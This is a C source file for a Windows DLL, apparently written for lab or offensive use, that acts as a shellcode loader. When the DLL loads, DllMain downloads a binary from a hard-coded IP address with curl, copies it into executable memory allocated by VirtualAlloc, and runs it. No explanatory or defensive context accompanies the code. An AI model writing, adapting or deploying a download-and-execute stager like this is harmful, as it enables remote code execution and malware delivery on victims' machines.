#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int injectionbit() {
	/* Download the shellcode */
	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char code[460];
	int counter = 0;
	fpipe = (FILE*)_popen(command, "r");
	if (fpipe == NULL) {
		return EXIT_FAILURE;
	}
	while (fread(&c, sizeof(c), 1, fpipe)) {
		code[counter] = c;
		counter += 1;
	}
	_pclose(fpipe);

	/* Run the code */
	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return EXIT_SUCCESS;
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD Reason, LPVOID lpvReserved) {

	switch (Reason) {

	case DLL_PROCESS_ATTACH:
		injectionbit();
		break;
	}

	return TRUE;
}